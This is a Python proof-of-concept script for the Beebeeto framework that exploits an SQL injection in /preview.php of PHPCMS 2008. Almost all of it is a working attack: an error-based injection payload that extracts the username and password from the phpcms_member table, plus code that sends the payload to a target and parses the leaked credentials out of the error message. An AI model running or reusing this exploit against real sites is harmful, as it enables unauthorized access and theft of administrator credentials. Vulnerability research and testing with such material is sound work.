#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0115',
            'name': 'PHPCMS 2008 /preview.php SQL注入漏洞 POC',
            'author': '1024',
            'create_date': '2014-10-25',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPCMS',
            'vul_version': ['2008'],
            'type': 'SQL Injection',
            'tag': ['PHPCMS漏洞', 'SQL注入漏洞', '/preview.php', 'php'],
            'desc': 'N/A',
            'references': ['http://www.wooyun.org/bugs/wooyun-2013-022112',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/preview.php?info[catid]=15&content=a[page]b&info[contentid]=2'%20and%20(select%201%20from("
                   "select%20count(*),concat((select%20(select%20(select%20concat(0x7e,0x27,username,0x3a,password,"
                   "0x27,0x7e)%20from%20phpcms_member%20limit%200,1))%20from%20information_schema.tables%20limit%200"
                   ",1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)--%20a")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        reg = re.compile("Duplicate entry '~'(.*?)'~1' for key 'group_key'")
        res = reg.findall(content)
        if res:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['Admin_pwd'] = res[0]
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())